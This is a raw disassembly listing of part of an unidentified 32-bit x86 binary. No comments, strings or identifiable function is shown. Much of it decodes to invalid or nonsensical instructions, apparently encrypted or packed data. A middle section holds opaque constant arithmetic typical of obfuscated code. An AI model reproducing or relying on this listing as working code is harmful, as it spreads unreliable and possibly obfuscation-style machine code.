  40f894:	sub    BYTE PTR [esi],0xbf
  40f897:	loope  0x40f896
  40f899:	leave  
  40f89a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f89b:	mov    ebx,0x8ed4e03c
  40f8a0:	push   edx
  40f8a1:	out    0xd,eax
  40f8a3:	add    edx,eax
  40f8a5:	adc    eax,0x2765673c
  40f8aa:	add    al,0x38
  40f8ac:	mov    ebx,0xa3097251
  40f8b1:	xlat   BYTE PTR ds:[ebx]
  40f8b2:	dec    esi
  40f8b3:	loope  0x40f913
  40f8b5:	data16 add dh,BYTE PTR [edi-0x3e32c64c]
  40f8bc:	pop    esi
  40f8bd:	ja     0x40f873
  40f8bf:	inc    edi
  40f8c0:	ror    DWORD PTR [ecx],1
  40f8c2:	lods   al,BYTE PTR ds:[esi]
  40f8c3:	ret    
  40f8c4:	push   ebp
  40f8c5:	shl    DWORD PTR [edx],cl
  40f8c7:	dec    ebx
  40f8c8:	mov    bl,0x59
  40f8ca:	dec    ecx
  40f8cb:	or     eax,0x767e1e42
  40f8d0:	adc    ebx,esi
  40f8d2:	pop    edx
  40f8d3:	mov    esp,0xae013984
  40f8d8:	jmp    DWORD PTR [eax-0x385049f3]
  40f8de:	out    0xd7,al
  40f8e0:	icebp  
  40f8e1:	push   0x5013d93a
  40f8e6:	pop    ebp
  40f8e7:	aaa    
  40f8e8:	ret    
  40f8e9:	stc    
  40f8ea:	xchg   dl,ah
  40f8ec:	jp     0x40f8b2
  40f8ee:	lahf   
  40f8ef:	or     BYTE PTR [eax-0x1cb81ac9],ah
  40f8f5:	pushf  
  40f8f6:	or     eax,0xb7473b1e
  40f8fb:	daa    
  40f8fc:	sti    
  40f8fd:	adc    eax,DWORD PTR [ebp-0x50]
  40f900:	pop    esi
  40f901:	and    dh,BYTE PTR [edx]
  40f903:	int3   
  40f904:	cmp    esp,edi
  40f906:	fst    DWORD PTR [eax+0x50]
  40f909:	push   edx
  40f90a:	push   ebx
  40f90b:	inc    esi
  40f90c:	test   DWORD PTR [edi],esp
  40f90e:	or     al,0xc0
  40f910:	call   0xa3a7:0x39920b52
  40f917:	sub    DWORD PTR [ebx+0x76],esp
  40f91a:	xchg   esi,eax
  40f91b:	sub    DWORD PTR [edx-0x8],edx
  40f91e:	stos   BYTE PTR es:[edi],al
  40f91f:	jp     0x40f992
  40f921:	rcl    BYTE PTR [edi],cl
  40f923:	jnp    0x40f95c
  40f925:	ror    DWORD PTR [ebx+eax*1-0x47],1
  40f929:	jmp    0x9e60:0x68d03949
  40f930:	cmp    eax,0x55d1f4ea
  40f935:	sahf   
  40f936:	inc    esp
  40f937:	call   0x93ac890a
  40f93c:	xlat   BYTE PTR ds:[ebx]
  40f93d:	stos   DWORD PTR es:[edi],eax
  40f93e:	pushf  
  40f93f:	fisttp WORD PTR [esi]
  40f941:	add    eax,0x5ffc8769
  40f946:	stos   DWORD PTR es:[edi],eax
  40f947:	pop    eax
  40f948:	(bad)  
  40f949:	int3   
  40f94a:	sti    
  40f94b:	push   ebp
  40f94c:	dec    edx
  40f94d:	gs (bad) 
  40f94f:	inc    esp
  40f950:	pop    edi
  40f951:	pop    esp
  40f952:	mov    esi,0xb5ad19ba
  40f957:	cmp    bh,0x46
  40f95a:	adc    eax,0xaadce3ad
  40f95f:	neg    DWORD PTR [eax+0x6a9de44c]
  40f965:	call   0xb831:0x885db31e
  40f96c:	jno    0x40f94a
  40f96e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f96f:	sbb    al,0x90
  40f971:	lock add BYTE PTR [ebx-0x803f9d6],dh
  40f978:	sub    DWORD PTR [ebx+0x62d9f2e8],esp
  40f97e:	and    al,0xc4
  40f980:	cmp    eax,0xb358dda9
  40f985:	or     DWORD PTR [ebp-0x2c6f5f3e],edx
  40f98b:	into   
  40f98c:	inc    eax
  40f98d:	jne    0x40f930
  40f98f:	add    DWORD PTR [edi-0x7],0xfffffff6
  40f993:	and    al,BYTE PTR [eax+edx*1+0xf1a34aa]
  40f99a:	dec    eax
  40f99b:	sub    DWORD PTR ds:0xe6c20182,eax
  40f9a1:	fsubr  DWORD PTR [eax-0x2b6c035a]
  40f9a7:	sbb    eax,0xb2ebe7ae
  40f9ac:	in     eax,0x40
  40f9ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9af:	fbstp  TBYTE PTR [ecx-0x784dc315]
  40f9b5:	sub    BYTE PTR [edi+eiz*1],bl
  40f9b8:	cwde   
  40f9b9:	sahf   
  40f9ba:	in     al,0x14
  40f9bc:	scas   eax,DWORD PTR es:[edi]
  40f9bd:	outs   dx,BYTE PTR ds:[esi]
  40f9be:	rcl    DWORD PTR [ecx],1
  40f9c0:	add    bh,dl
  40f9c2:	lods   al,BYTE PTR ds:[esi]
  40f9c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9c4:	lds    edi,FWORD PTR [ebx]
  40f9c6:	cmp    DWORD PTR [edi+0x7aff7f76],0xffffff95
  40f9cd:	xor    edx,DWORD PTR [ebx-0x7]
  40f9d0:	inc    ebp
  40f9d1:	add    eax,0xc628e093
  40f9d6:	adc    DWORD PTR [ebx+0x53],esi
  40f9d9:	fist   WORD PTR [edx+0x39]
  40f9dc:	test   al,0x8
  40f9de:	inc    edi
  40f9df:	mov    edx,0xc12b849a
  40f9e4:	xor    eax,0xc3e
  40f9e9:	mov    DWORD PTR [ebp-0x58],eax
  40f9ec:	mov    DWORD PTR [ebp-0x14],0x66bd
  40f9f3:	pop    ecx
  40f9f4:	mov    DWORD PTR [ebp-0x4],ecx
  40f9f7:	mov    DWORD PTR [ebp-0x8],0x3374
  40f9fe:	mov    DWORD PTR [ebp-0xc],0x3c31
  40fa05:	mov    eax,DWORD PTR [ebp-0xc]
  40fa08:	mov    edx,DWORD PTR [ebp-0x8]
  40fa0b:	mov    esi,DWORD PTR [ebp-0x4]
  40fa0e:	xor    eax,edx
  40fa10:	xor    edx,edx
  40fa12:	div    esi
  40fa14:	mov    edx,DWORD PTR [ebp-0x14]
  40fa17:	and    eax,edx
  40fa19:	sub    eax,0x680
  40fa1e:	mov    DWORD PTR [ebp-0x24],eax
  40fa21:	mov    DWORD PTR [ebp-0x30],0x5f68
  40fa28:	mov    DWORD PTR [ebp-0x2c],0x398b
  40fa2f:	mov    DWORD PTR [ebp-0x4],0x5034
  40fa36:	mov    DWORD PTR [ebp-0x8],0x7cbf
  40fa3d:	mov    DWORD PTR [ebp-0xc],0x4f6c
  40fa44:	mov    DWORD PTR [ebp-0x14],0xee2
  40fa4b:	mov    eax,DWORD PTR [ebp-0x14]
  40fa4e:	add    eax,DWORD PTR [ebp-0xc]
  40fa51:	mov    edx,DWORD PTR [ebp-0x8]
  40fa54:	xor    eax,edx
  40fa56:	mov    edx,DWORD PTR [ebp-0x4]
  40fa59:	or     eax,edx
  40fa5b:	mov    edx,DWORD PTR [ebp-0x2c]
  40fa5e:	or     eax,edx
  40fa60:	mov    edx,DWORD PTR [ebp-0x30]
  40fa63:	and    eax,edx
  40fa65:	mov    edx,0x5b68
  40fa6a:	sub    edx,eax
  40fa6c:	mov    DWORD PTR [ebp-0x24],edx
  40fa6f:	mov    DWORD PTR [ebp-0x48],0x3308
  40fa76:	mov    DWORD PTR [ebp-0x44],0x59a4
  40fa7d:	mov    DWORD PTR [ebp-0x38],0x2775
  40fa84:	mov    DWORD PTR [ebp-0x34],0x4da
  40fa8b:	mov    DWORD PTR [ebp-0x40],0x49d8
  40fa92:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  40fa99:	mov    DWORD PTR [ebp-0x28],0x338c
  40faa0:	mov    DWORD PTR [ebp-0x24],0x68ed
  40faa7:	mov    DWORD PTR [ebp-0x20],0x2a7b
  40faae:	mov    DWORD PTR [ebp-0x1c],0x718f
  40fab5:	mov    eax,DWORD PTR [ebp-0x20]
  40fab8:	mov    edx,DWORD PTR [ebp-0x1c]
  40fabb:	mov    esi,DWORD PTR [ebp-0x28]
  40fabe:	mov    ebx,DWORD PTR [ebp-0x24]
  40fac1:	add    eax,0xffffc948
  40fac6:	adc    edx,0xffff87b0
  40facc:	or     eax,esi
  40face:	mov    esi,DWORD PTR [ebp-0x40]
  40fad1:	or     eax,esi
  40fad3:	or     edx,ebx
  40fad5:	mov    ebx,DWORD PTR [ebp-0x3c]
  40fad8:	mov    esi,DWORD PTR [ebp-0x38]
  40fadb:	or     edx,ebx
  40fadd:	mov    ebx,DWORD PTR [ebp-0x34]
  40fae0:	sub    eax,esi
  40fae2:	mov    esi,DWORD PTR [ebp-0x48]
  40fae5:	sbb    edx,ebx
  40fae7:	mov    ebx,DWORD PTR [ebp-0x44]
  40faea:	or     eax,esi
  40faec:	or     edx,ebx
  40faee:	add    eax,0x89b
  40faf3:	mov    DWORD PTR [ebp-0x20],eax
  40faf6:	adc    edx,0x5a
  40faf9:	mov    DWORD PTR [ebp-0x1c],edx
  40fafc:	mov    DWORD PTR [ebp-0x80],0xfa4
  40fb03:	mov    DWORD PTR [ebp-0x70],0x618e
  40fb0a:	mov    DWORD PTR [ebp-0x6c],0x811
  40fb11:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  40fb1b:	mov    DWORD PTR [ebp-0x94],0xe82c1
  40fb25:	mov    DWORD PTR [ebp-0x88],0x58ff
  40fb2f:	mov    DWORD PTR [ebp-0x84],0x7394
  40fb39:	xor    eax,eax
  40fb3b:	inc    eax
  40fb3c:	mov    DWORD PTR [ebp-0x64],eax
  40fb3f:	mov    DWORD PTR [ebp-0x8],0x5f59
  40fb46:	mov    DWORD PTR [ebp-0x4],0x652b
  40fb4d:	mov    DWORD PTR [ebp-0xc],0xf43
  40fb54:	mov    DWORD PTR [ebp-0x14],0x22dc
  40fb5b:	mov    DWORD PTR [ebp-0x2c],0x45d4
  40fb62:	mov    DWORD PTR [ebp-0x30],0x28e1
  40fb69:	mov    DWORD PTR [ebp-0x7c],0x5e09
  40fb70:	mov    DWORD PTR [ebp-0x50],0x3910
  40fb77:	mov    DWORD PTR [ebp-0x3c],0x5c97
  40fb7e:	mov    DWORD PTR [ebp-0x24],0x6111
  40fb85:	mov    DWORD PTR [ebp-0x78],ecx
  40fb88:	mov    DWORD PTR [ebp-0x34],ecx
  40fb8b:	mov    DWORD PTR [ebp-0x44],0x207a
  40fb92:	mov    DWORD PTR [ebp-0x60],eax
  40fb95:	mov    DWORD PTR [ebp-0x8c],0x7840
  40fb9f:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  40fba6:	mov    eax,DWORD PTR [ebp-0x30]
  40fba9:	or     eax,0x70c5
  40fbae:	add    eax,DWORD PTR [ebp-0x2c]
  40fbb1:	mov    ecx,DWORD PTR [ebp-0x14]
  40fbb4:	or     eax,ecx
  40fbb6:	mov    ecx,0xce40
  40fbbb:	sub    ecx,eax
  40fbbd:	mov    eax,DWORD PTR [ebp-0xc]
  40fbc0:	sub    ecx,eax
  40fbc2:	imul   ecx,ecx,0x7480
  40fbc8:	add    ecx,DWORD PTR [ebp-0x58]
  40fbcb:	mov    eax,DWORD PTR [ebp-0x8]
  40fbce:	push   ecx
  40fbcf:	mov    ecx,DWORD PTR [ebp-0x4]
  40fbd2:	lea    eax,[ecx+eax*1-0x1e6d]
  40fbd9:	mov    ecx,DWORD PTR [ebp-0x64]
  40fbdc:	xor    edx,edx
  40fbde:	div    ecx
  40fbe0:	mov    ecx,DWORD PTR [ebp-0x74]
  40fbe3:	lea    eax,[eax+ecx*1-0xa617]
  40fbea:	push   eax
  40fbeb:	mov    eax,DWORD PTR [ebp-0x88]
  40fbf1:	mov    ecx,DWORD PTR [ebp-0x84]
  40fbf7:	push   0x770a
  40fbfc:	push   0x2a0c
  40fc01:	push   ecx
  40fc02:	push   eax
  40fc03:	call   0x416c20
  40fc08:	mov    ecx,DWORD PTR [ebp-0x98]
  40fc0e:	mov    esi,DWORD PTR [ebp-0x94]
  40fc14:	push   esi
  40fc15:	push   ecx
  40fc16:	or     edx,0x615d
  40fc1c:	or     eax,0x455c
  40fc21:	push   edx
  40fc22:	push   eax
  40fc23:	call   0x42206f
  40fc28:	mov    ecx,DWORD PTR [ebp-0x70]
  40fc2b:	mov    edx,DWORD PTR [ebp-0x6c]
  40fc2e:	xor    eax,ecx
  40fc30:	mov    ecx,DWORD PTR [ebp-0x20]
  40fc33:	mov    edx,DWORD PTR [ebp-0x1c]
  40fc36:	mov    esi,DWORD PTR [ebp-0x80]
  40fc39:	and    eax,0xb49
  40fc3e:	add    esi,0x629b
  40fc44:	lea    eax,[eax+ecx*1-0xfd]
  40fc4b:	xor    esi,0x4994
  40fc51:	push   eax
  40fc52:	lea    esi,[ebp+esi*1-0x3c93]
  40fc59:	call   0x41066f
  40fc5e:	mov    ecx,eax
  40fc60:	mov    eax,DWORD PTR [ebp-0x50]
  40fc63:	mov    edx,DWORD PTR [ebp-0x7c]
  40fc66:	sub    eax,0x161
  40fc6b:	xor    eax,edx
  40fc6d:	imul   eax,eax,0x5151
  40fc73:	jmp    0x40ff41
  40fc78:	fiadd  WORD PTR [edi-0x46]
  40fc7b:	rcr    DWORD PTR [edx],1
  40fc7d:	dec    esp
  40fc7e:	fisub  DWORD PTR [esi]
  40fc80:	out    dx,eax
  40fc81:	mov    bl,BYTE PTR [ebp+0x6f50ef70]
  40fc87:	mov    al,0x76
  40fc89:	sahf   
  40fc8a:	sbb    BYTE PTR [eax],bl
  40fc8c:	mov    esi,0x28181814
  40fc91:	add    BYTE PTR [edi+0x2f],dh
  40fc94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc95:	test   DWORD PTR [edx-0x72b43717],esi
  40fc9b:	or     DWORD PTR [ebp+0x78],0xb7562cea
  40fca2:	mov    bh,0x62
  40fca4:	xchg   edi,eax
  40fca5:	pusha  
  40fca6:	and    eax,0x4238c8c3
  40fcab:	aaa    
  40fcac:	pop    eax
  40fcad:	xchg   ecx,eax
  40fcae:	xchg   ebx,eax
  40fcaf:	retf   0x1e1c
  40fcb2:	cmovno ebp,DWORD PTR [edx+0x34b4c5dd]
  40fcb9:	dec    ebx
  40fcba:	pop    edi
  40fcbb:	cmp    cl,BYTE PTR [ecx-0x63]
  40fcbe:	or     BYTE PTR [ecx+0x6dd0898c],cl
  40fcc4:	or     eax,0x35601186
  40fcc9:	inc    edi
  40fcca:	out    0x56,eax
  40fccc:	mov    ebp,0xd8737d4d
  40fcd1:	les    esp,FWORD PTR [edx+0x31]
  40fcd4:	stos   BYTE PTR es:[edi],al
  40fcd5:	out    0x6e,eax
  40fcd7:	cs ja  0x40fcf2
  40fcda:	mov    ds:0xa0f34635,al
  40fcdf:	out    0x4c,eax
  40fce1:	mov    edi,0x938678ee
  40fce6:	das    
  40fce7:	and    BYTE PTR [ecx+0x6],bh
  40fcea:	and    al,0x4
  40fcec:	retf   
  40fced:	inc    ebp
  40fcee:	sbb    DWORD PTR [edx],ebx
  40fcf0:	int3   
  40fcf1:	mov    bh,0x9e
  40fcf3:	lock call 0xc1e775a
  40fcf9:	jmp    0x1c09:0xeffcd119
  40fd00:	xchg   ebx,eax
  40fd01:	xor    DWORD PTR [edi-0x3b],0x50c12d25
  40fd08:	or     eax,0x557fb9f3
  40fd0d:	mov    al,ds:0x9fddc58b
  40fd12:	mov    al,0x6
  40fd14:	int3   
  40fd15:	ds dec eax
  40fd17:	pop    ecx
  40fd18:	jnp    0x40fcf9
  40fd1a:	pop    eax
  40fd1b:	mov    al,ds:0x27224192
  40fd20:	popa   
  40fd21:	mov    ebp,0x6c951103
  40fd26:	inc    DWORD PTR [edx+0x1b14b632]
  40fd2c:	int3   
  40fd2d:	mov    edx,0xb2ea0ab7
  40fd32:	adc    eax,0x8b16af75
  40fd37:	xchg   ebp,eax
  40fd38:	arpl   WORD PTR [eax-0x1e],bp
  40fd3b:	lods   al,BYTE PTR ds:[esi]
  40fd3c:	ror    DWORD PTR [ebp-0x2b],1
  40fd3f:	lds    esp,FWORD PTR [ebx+0x5b0adcb5]
  40fd45:	push   es
  40fd46:	rol    DWORD PTR [ebx],cl
  40fd48:	icebp  
  40fd49:	ins    DWORD PTR es:[edi],dx
  40fd4a:	jae    0x40fd90
  40fd4c:	adc    bh,BYTE PTR [eax+0x72f44d19]
  40fd52:	test   BYTE PTR [eax],al
  40fd54:	add    edi,edx
  40fd56:	mov    al,ds:0x166c1092
  40fd5b:	aad    0x95
  40fd5d:	(bad)  
  40fd5e:	cli    
  40fd5f:	sbb    DWORD PTR [ebx+0x59cb1536],edi
  40fd65:	mov    ah,0x6a
  40fd67:	xchg   esp,eax
  40fd68:	leave  
  40fd69:	xor    ah,BYTE PTR [edi+0x39114f61]
  40fd6f:	dec    ecx
  40fd70:	loope  0x40fd86
  40fd72:	(bad)  
  40fd73:	fwait
  40fd74:	daa    
  40fd75:	jg     0x40fdbe
  40fd77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd78:	sbb    bh,BYTE PTR [eax]
  40fd7a:	dec    edi
  40fd7b:	inc    ebp
  40fd7c:	adc    dh,BYTE PTR [edi+0x4]
  40fd7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd80:	into   
  40fd81:	loope  0x40fd0c
  40fd83:	dec    ebx
  40fd84:	cli    
  40fd85:	cmp    ebx,DWORD PTR [edx]
  40fd87:	jb     0x40fda8
  40fd89:	out    0x93,al
  40fd8b:	xchg   ebx,eax
  40fd8c:	pop    ebp
  40fd8d:	xor    DWORD PTR ds:0xa464f590,ecx
  40fd93:	nop
  40fd94:	imul   edi,DWORD PTR [di+0x70],0xa2248ceb
  40fd9d:	cdq    
  40fd9e:	loopne 0x40fdd9
  40fda0:	iret   
  40fda1:	aad    0x57
  40fda3:	loope  0x40fdce
  40fda5:	or     DWORD PTR [edi],edx
  40fda7:	xchg   edi,eax
  40fda8:	(bad)  [edx-0x70]
  40fdab:	cmp    BYTE PTR [ecx],ah
  40fdad:	push   ds
  40fdae:	adc    BYTE PTR [esi+0x76014fcc],dl
  40fdb4:	dec    ebx
  40fdb5:	iret   
  40fdb6:	ds lahf 
  40fdb8:	sbb    bl,dl
  40fdba:	jp     0x40fdb6
  40fdbc:	call   0xa6e65959
  40fdc1:	jne    0x40fe1c
  40fdc3:	and    BYTE PTR [eax+0x5748247b],0x61
  40fdca:	adc    edx,DWORD PTR ds:[edi+0xa]
  40fdce:	cmc    
  40fdcf:	sbb    eax,0x969dd8ee
  40fdd4:	loopne 0x40fdfd
  40fdd6:	iret   
  40fdd7:	cmp    al,0xe4
  40fdd9:	aas    
  40fdda:	jo     0x40fdc4
  40fddc:	stos   DWORD PTR es:[edi],eax
  40fddd:	add    al,0x8c
  40fddf:	in     eax,0x10
  40fde1:	mov    ?,WORD PTR [edx-0x17]
  40fde4:	(bad)  
  40fde5:	das    
  40fde6:	nop
  40fde7:	sbb    DWORD PTR [ecx-0x3d],ecx
  40fdea:	les    ebx,FWORD PTR [esi-0x351c4939]
  40fdf0:	pop    ecx
  40fdf1:	out    dx,al
  40fdf2:	add    BYTE PTR [eax+0x4d4ff26f],bh
  40fdf8:	push   ebp
  40fdf9:	scas   al,BYTE PTR es:[edi]
  40fdfa:	stc    
  40fdfb:	js     0x40fdab
  40fdfd:	inc    ebx
  40fdfe:	adc    ecx,edi
  40fe00:	xchg   esp,eax
  40fe01:	repnz push edi
  40fe03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe04:	ror    DWORD PTR [edi+0x2cbeb30f],0x71
  40fe0b:	clc    
  40fe0c:	pop    edi
  40fe0d:	push   es
  40fe0e:	mov    ah,0x9d
  40fe10:	ror    BYTE PTR [eax+eiz*4-0x45],cl
  40fe14:	and    dh,BYTE PTR [ebp-0x1b]
  40fe17:	and    DWORD PTR [ebp-0x30],edx
  40fe1a:	or     eax,0xd1109479
  40fe1f:	jp     0x40fe38
  40fe21:	call   0x5924:0x4ed7f188
  40fe28:	sub    BYTE PTR [eax],dh
  40fe2a:	ja     0x40fe22
  40fe2c:	cmp    eax,0x105e338c
  40fe31:	mov    dh,0x20
  40fe33:	fcomi  st,st(1)
  40fe35:	ins    DWORD PTR es:[edi],dx
  40fe36:	addr16 call 0xe2f494fe
  40fe3c:	test   al,0xf0
  40fe3e:	sbb    al,0x47
  40fe40:	data16 fld QWORD PTR [eax+eiz*2]
  40fe44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe45:	cwde   
  40fe46:	jae    0x40fdd2
  40fe48:	jne    0x40fdd9
  40fe4a:	cmp    BYTE PTR [ebp-0x59],ch
  40fe4d:	cmp    eax,0xd8c39f13
  40fe52:	jbe    0x40fe89
  40fe54:	mov    bh,0x4a
  40fe56:	pop    edi
  40fe57:	sub    BYTE PTR [edx],al
  40fe59:	xchg   esp,eax
  40fe5a:	cmp    DWORD PTR [edx-0x79],eax
  40fe5d:	out    dx,eax
  40fe5e:	in     al,dx
  40fe5f:	dec    edi
  40fe60:	les    ebx,FWORD PTR [ecx]
  40fe62:	rcr    DWORD PTR [esi+0x24],1
  40fe65:	sti    
  40fe66:	adc    DWORD PTR [ebx+0x12],esi
  40fe69:	xor    esp,DWORD PTR [esi]
  40fe6b:	sub    eax,0x9cc25fa3
  40fe70:	push   edi
  40fe71:	jmp    0xfd70fe4f
  40fe76:	mov    ch,0x2d
  40fe78:	test   al,0x35
  40fe7a:	sti    
  40fe7b:	cmp    ah,BYTE PTR [edi+0x70]
  40fe7e:	sub    esp,DWORD PTR ds:0xf24301b6
  40fe84:	pop    ecx
  40fe85:	mov    eax,DWORD PTR [ecx]
  40fe87:	jmp    0x36e7:0xf966e5fe
  40fe8e:	jmp    0x40feb1
  40fe90:	popf   
  40fe91:	push   esp
  40fe92:	aaa    
  40fe93:	jge    0x40fe64
  40fe95:	cs jnp 0x40ff0c
  40fe98:	cs pop ss
  40fe9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe9b:	addr16 push ebp
  40fe9d:	iret   
  40fe9e:	fistp  QWORD PTR gs:[ebx-0x6e]
  40fea2:	jge    0x40feaf
  40fea4:	lods   eax,DWORD PTR ds:[esi]
  40fea5:	loop   0x40fe4f
  40fea7:	cmp    al,0x74
  40fea9:	adc    DWORD PTR [ebp+ebp*2-0x305e06fc],esi
  40feb0:	into   
  40feb1:	out    0xdb,eax
  40feb3:	mov    ebp,0x3d10b69a
  40feb8:	std    
  40feb9:	aam    0xf8
  40febb:	lahf   
  40febc:	cmc    
  40febd:	adc    eax,0xd4ea0500
  40fec2:	lods   eax,DWORD PTR ds:[esi]
  40fec3:	fcom   DWORD PTR [ecx+0x297d0d30]
  40fec9:	jmp    0xf268:0xdd8d8603
  40fed0:	push   ds
  40fed1:	popf   
  40fed2:	in     eax,dx
  40fed3:	sub    al,0xec
  40fed5:	test   eax,0x2d9daeb
  40feda:	jg     0x40ff5b
  40fedc:	hlt    
  40fedd:	xor    al,0x63
  40fedf:	enter  0xf66d,0xb0
  40fee3:	jl     0x40ff1d
  40fee5:	ss sub edi,esp
  40fee8:	xor    ecx,ebx
  40feea:	popa   
  40feeb:	popf   
  40feec:	and    bl,BYTE PTR [ebx+0x28]
  40feef:	mov    ah,0x72
  40fef1:	mov    bl,BYTE PTR [edx]
  40fef3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fef4:	jo     0x40ff6e
  40fef6:	push   ds
  40fef7:	inc    esp
  40fef8:	je     0x40ff67
  40fefa:	jmp    0x3468:0x7c161471
  40ff01:	cmp    edi,DWORD PTR [ecx]
  40ff03:	in     al,0x79
  40ff05:	sub    BYTE PTR [eax-0x7a],ch
  40ff08:	lods   al,BYTE PTR ds:[si]
  40ff0a:	outs   dx,BYTE PTR ds:[esi]
  40ff0b:	jle    0x40feb0
  40ff0d:	fsub   QWORD PTR [ebx+eiz*2]
  40ff10:	pop    edi
  40ff11:	mov    dh,0xf7
  40ff13:	in     eax,dx
  40ff14:	popf   
  40ff15:	push   ss
  40ff16:	int3   
  40ff17:	inc    esi
  40ff18:	je     0x40fea1
  40ff1a:	retf   
  40ff1b:	lahf   
  40ff1c:	loope  0x40ff26
  40ff1e:	daa    
  40ff1f:	add    DWORD PTR [ecx-0x4493cd22],edi
  40ff25:	inc    eax
  40ff26:	out    dx,eax
  40ff27:	std    
  40ff28:	add    ah,BYTE PTR [ebp+0x2b]
  40ff2b:	fidivr DWORD PTR ds:0x6d0e62e
  40ff31:	stc    
  40ff32:	jl     0x40ff57
  40ff34:	arpl   WORD PTR ds:0x8612c7e,bx
  40ff3a:	les    ecx,FWORD PTR [edi+0x69c53dfa]
  40ff40:	sbb    eax,0x390105
  40ff45:	add    BYTE PTR ds:0x40c2,dh
  40ff4b:	xor    edx,edx
  40ff4d:	mov    esi,0x218f6c45
  40ff52:	div    esi
  40ff54:	cmp    ecx,eax
  40ff56:	jmp    0x410224
  40ff5b:	ss int 0x1f
  40ff5e:	jnp    0x40ff7a
  40ff60:	pop    ebx
  40ff61:	xor    bl,BYTE PTR [ebp+ebx*1-0x21838c47]
  40ff68:	jbe    0x40ffad
  40ff6a:	push   0x1d
  40ff6c:	cwde   
  40ff6d:	sbb    BYTE PTR [eax],bl
  40ff6f:	mov    esi,0x66181814
  40ff74:	push   0x8e0a26c6
  40ff79:	(bad)  
  40ff7a:	pushf  
  40ff7b:	mov    ds:0x7c48accb,eax
  40ff80:	icebp  
  40ff81:	push   cs
  40ff82:	outs   dx,BYTE PTR ds:[esi]
  40ff83:	mov    ebx,0x7e579aff
  40ff88:	ret    
  40ff89:	cdq    
  40ff8a:	pop    ecx
  40ff8b:	xor    cl,BYTE PTR [edx]
  40ff8d:	inc    ebx
  40ff8e:	enter  0x2824,0xf5
  40ff92:	popw   es
  40ff94:	(bad)  
  40ff95:	sub    DWORD PTR [ebx],esp
  40ff97:	cli    
  40ff98:	jl     0x40ff3f
  40ff9a:	fnstenv [edx-0x60]
  40ff9d:	fcmovnb st,st(5)
  40ff9f:	or     BYTE PTR [ecx],ah
  40ffa1:	test   al,0x3b
  40ffa3:	test   BYTE PTR [esi+0x10912f2],ah
  40ffa9:	dec    BYTE PTR [edi+0x35139250]
  40ffaf:	pop    ecx
  40ffb0:	adc    bh,BYTE PTR [bp+si]
  40ffb3:	lahf   
  40ffb4:	cmp    al,0x7b
  40ffb6:	je     0x410008
  40ffb8:	and    BYTE PTR [ebx-0x8f11c51],dl
  40ffbe:	or     dh,bl
  40ffc0:	or     ebp,0xd0a463b2
  40ffc6:	lahf   
  40ffc7:	mov    dh,0x43
  40ffc9:	or     bh,ch
  40ffcb:	sub    DWORD PTR [edx],0xdee63f44
  40ffd1:	push   eax
  40ffd2:	cmp    al,0xf6
  40ffd4:	stc    
  40ffd5:	add    ebx,esp
  40ffd7:	jnp    0x40ff7f
  40ffd9:	xor    eax,0xffffffdc
  40ffdc:	pop    ecx
  40ffdd:	fs mov edx,0x2ceb1ce1
  40ffe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffe4:	add    BYTE PTR [ebp+0x53],cl
  40ffe7:	jb     0x40ffb0
  40ffe9:	jp     0x410000
  40ffeb:	xor    ebp,DWORD PTR [edx]
  40ffed:	sbb    al,0xf4
  40ffef:	cmp    BYTE PTR [ecx-0x7c],0x61
  40fff3:	nop
  40fff4:	jns    0x40fff2
  40fff6:	jmp    0x9ed7ae4d
  40fffb:	xor    ecx,eax
  40fffd:	cmp    cl,cl
  40ffff:	xchg   DWORD PTR [ecx+0x649e3d62],ebx
  410005:	mov    ebx,0x53b6ce40
  41000a:	jmp    0xa575:0xf3d412bc
  410011:	jo     0x410053
  410013:	ins    BYTE PTR es:[edi],dx
  410014:	fwait
  410015:	inc    edx
  410016:	adc    dh,dh
  410018:	jp     0x40fffb
  41001a:	pop    esi
  41001b:	int    0xa
  41001d:	push   cs
  41001e:	or     DWORD PTR [ebp+ebx*2-0xa],esi
  410022:	cmp    eax,0xae2cb709
  410027:	jb     0x41002c
  410029:	mov    edi,ds
  41002b:	repz ficomp DWORD PTR [ebx+0x25bee973]
  410032:	xchg   ebp,eax
  410033:	inc    ecx
  410034:	add    eax,0xadbada1
  410039:	cmp    eax,0xc1aa3e87
  41003e:	shl    DWORD PTR [ecx-0x47],1
  410041:	gs and dl,bl
  410044:	popa   
  410045:	jl     0x410072
  410047:	pop    edi
  410048:	add    al,0xd5
  41004a:	shr    dl,0x6
  41004d:	enter  0xf0c5,0x21
  410051:	popf   
  410052:	xor    BYTE PTR [edi],bl
  410054:	ret    
  410055:	cdq    
  410056:	jle    0x4100be
  410058:	sub    al,BYTE PTR [edi-0x5f]
  41005b:	arpl   WORD PTR ds:0x7651bcd,sp
  410061:	das    
  410062:	jns    0x41006d
  410064:	mov    al,ds:0xb50c71df
  410069:	sub    DWORD PTR [edx+0x58baea04],esi
  41006f:	xchg   dh,ah
  410071:	add    BYTE PTR [edi-0x75],dl
  410074:	jo     0x410019
  410076:	enter  0x684a,0x8f
  41007a:	ficom  WORD PTR [ebp+0x45b4ba46]
  410080:	addr16 mov ecx,0xba7d6eb6
  410086:	pop    edi
  410087:	cmp    al,0xdc
  410089:	ja     0x41009f
  41008b:	xlat   BYTE PTR ds:[ebx]
  41008c:	sub    esi,DWORD PTR [ebx+0x5d]
  41008f:	out    0xb1,eax
  410091:	das    
  410092:	repnz sub cl,BYTE PTR [edi+eiz*8]
  410096:	or     eax,0x246fc1a5
  41009b:	in     al,dx
  41009c:	aam    0x10
  41009e:	fdivr  QWORD PTR [ebx]
  4100a0:	daa    
  4100a1:	mov    DWORD PTR [ebx+0x4d],edi
  4100a4:	jp     0x4100fc
  4100a6:	add    BYTE PTR [edx+eax*8+0x6d43a4f1],cl
